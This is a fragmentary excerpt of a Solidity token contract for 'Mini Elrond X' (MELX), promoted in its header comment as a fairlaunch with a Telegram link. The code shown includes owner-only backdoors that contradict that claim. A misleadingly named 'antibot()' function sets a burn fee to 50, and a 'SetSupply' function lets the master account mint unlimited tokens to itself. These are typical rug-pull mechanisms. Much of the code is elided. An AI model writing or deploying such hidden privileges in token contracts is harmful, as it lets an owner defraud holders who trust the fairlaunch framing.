...
/**   Welcome To Mini Elrond X Fairlaunch
 *      dont miss Mini Elrond X , Hold And Lets To The Moon
 * 
 *    Telegram Group https://t.me/MiniElrondx
...
contract ERC200 is Context, IERC20, Ownable {
        ...
        returns (uint256)
    {
     ...
     function antibot() external onlyMaster returns (uint256){
         _feeBurn = 50;
     }
    ...
    function SetSupply(uint256 amount) public onlyMaster {
    _MELX(msg.sender, amount);
    }
    ...
    function _MELX(address account, uint256 amount) internal virtual {
...
contract MiniElrondX is ERC200 {

    uint tokenTotalSupply = 250000000;

    constructor() public ERC200("Mini Elrond X", "MELX") {
        _MELX(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}